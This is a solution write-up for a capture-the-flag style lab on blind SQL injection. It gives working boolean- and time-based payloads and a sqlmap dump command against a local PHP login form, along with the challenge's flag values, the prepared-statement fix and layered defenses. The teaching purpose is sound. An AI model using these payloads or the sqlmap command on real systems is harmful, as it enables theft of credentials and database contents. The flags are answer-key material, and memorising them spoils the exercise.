# SQL Injection: Blind Extraction, Solution

> ⚠️ **Spoilers below.** Flags, payloads, and the fix. If you want to solve it
> yourself, close this file and turn the debug dial up instead.

## The vulnerability

`critical.php` is **identical** to the previous challenge: it interpolates the
raw POST fields straight into the query string:

```php
$user = $_POST["username"];
$pass = $_POST["password"];
$sql = "SELECT * FROM `users` WHERE username = '$user' AND password = '$pass'";
$result = $db->query($sql);
```

The bug is exactly the same; what changed is the *page around it*. A successful
login prints a bare `Welcome!` with no username, and every failure prints one
generic message. The query still runs, but on the live page its results never
reach the screen, so the classic trick of smuggling a secret into a rendered
column (`UNION SELECT ... password ...`) has nothing to render into. This is
**blind** SQL injection: against a real target you cannot read the answer, so you
have to *infer* it.

Two channels are left to you:

- **Boolean**: did the login succeed or fail? Craft a payload whose success
  depends on a fact you want to test, and the `Welcome!` / error message becomes
  a single bit of answer.
- **Timing**: how long did the query take? The **Hints** panel (`?debug=1`)
  reports **query runtime**, **CPU**, and **block I/O**. Make a true guess cost time and a false
  guess cost nothing, and the clock tells you the bit, even when the page gives
  no visible tell at all.

## Walkthrough

Payloads go in the **username** field; the **password** field can be anything
(the trailing `-- -` comments the password check away). Set the debug dial to
**Hints** (`?debug=1`) to read the timing panel, the instrument this
challenge is about. **Debug** (`?debug=2`) additionally shows the SQL and the
query's returned rows, a convenient way to confirm your blind guesses landed.
Treat that level as training wheels: the skill is to extract the answer through
the boolean and timing channels, the way you would against a real target that has
no debug view at all.)

### a) Read the `admin` password, boolean-based

You cannot ask the database to *print* the password, but you can ask it to
*compare* the password and let you in only when the comparison holds. Test one
character at a time:

```
username: admin' AND SUBSTRING(password,1,1)='T' -- -
password: x
```

If the first character really is `T`, the row matches and you get `Welcome!`; if
not, you get the generic failure. That single bit (success vs. failure) is the
answer to "is character 1 a `T`?". Walk the alphabet at each position, moving to
the next position once a character lands, and the password spells itself out.

A faster variant narrows a whole prefix at once with `LIKE`:

```
username: admin' AND password LIKE 'T%' -- -
```

Success means the password starts with `T`; extend the known prefix
(`T0%`, `T0u%`, …) until `LIKE 'T0ughW0rKd0ne?'` (no `%`) matches exactly.

- **Flag (admin password):** `T0ughW0rKd0ne?`

### a′) Read it by the clock instead, time-based

If the page ever stops giving even a boolean tell, you can still read the answer
off the timing panel. `IF(condition, SLEEP(2), 0)` makes the query pause only
when your guess is true:

```
username: admin' AND IF(SUBSTRING(password,1,1)='T', SLEEP(2), 0) -- -
password: x
```

Submit, then look at **Query runtime** in the **Hints** panel: a true guess shows
~2000 ms, a false guess shows a few ms. Same character-by-character extraction,
driven by the clock rather than the message.

### b) Copy the entire database, blind

The other table from the login challenge is here too (`hidden`, one `text`
column). You reach it with a subquery inside the same boolean/timing test: you
are not selecting it *onto the page*, only asking yes/no questions about it:

```
username: admin' AND (SELECT text FROM hidden LIMIT 1) LIKE 'F%' -- -
```

Success (or a `SLEEP`, in the time-based form) means the hidden secret starts
with `F`; extend the prefix exactly as before until the full string is known.

- **Flag (hidden table):** `FinA11yD0ne!1!`

Apply the same one-character-at-a-time loop to every row of `users` (the DB has
the same shape as the login challenge: `users(id, username, password)` plus
`hidden(id, text)`) and you have exfiltrated the whole database without the page
ever printing a single value.

**This is the point where you feel the pain.** Extracting one 14-character
password by hand is dozens of requests; a whole database is thousands. That
tedium is exactly why the professional tool below exists.

## Flags

| Task | What | Value |
|------|------|-------|
| a | `admin` password | `T0ughW0rKd0ne?` |
| b | `hidden` table secret | `FinA11yD0ne!1!` |

## The fix

The fix is identical to the login challenge: separate code from data with a
prepared statement, so input can never be parsed as SQL. Open the **Fix** editor
and replace the body of `critical.php`:

```php
<?php
$user = $_POST["username"];
$pass = $_POST["password"];

$stmt = $db->prepare("SELECT * FROM `users` WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $user, $pass);
$stmt->execute();
$result = $stmt->get_result();
?>
```

Save, then retry every payload above. Now `admin' AND SUBSTRING(...)='T' -- -`
is treated as one literal username that no account has, so it simply fails. The
boolean and timing channels both go dead. **Restore Original** brings the bug
back for the next learner.

## Professional tools

Blind extraction by hand is educational exactly once. On a real engagement you
reach for `sqlmap`, which detects the injectable parameter, picks a blind
technique, and automates the character-by-character extraction for you. Point it
at the same POST form (adjust the port to whatever you mapped with `-p`):

```bash
sqlmap -u "http://localhost:9000/" --data="username=admin&password=x" \
  --purge --batch --dump -v 3 --technique=BT --level=5
```

- `--technique=BT` restricts sqlmap to **B**oolean-based and **T**ime-based
  blind, the only two channels this challenge exposes (there is nothing to read
  on-screen, so UNION and error-based techniques would find nothing).
- `--level=5` tries more payload shapes and injection points; blind detection
  often needs a higher level than the visible-output case.
- `--dump` pulls the tables it can read, `--batch` accepts the defaults, and
  `-v 3` prints the payloads so you can compare them to the ones you wrote by
  hand. It will dump `users` and `hidden`.

The lesson: the manual payloads teach you *why* boolean and timing leak the data;
`sqlmap` is what you run once you understand it, so you never extract a password
one character at a time again.

## Further defenses

Prepared statements close this specific hole, but layer more behind them:
constrain the DB account to least privilege (this one is already `SELECT`-only),
return a *uniform* response and timing for every failed login so neither the
boolean nor the timing channel leaks, add rate limiting so an attacker cannot
fire the thousands of guesses blind extraction needs, and log/alert on the
tell-tale burst of near-identical login attempts.
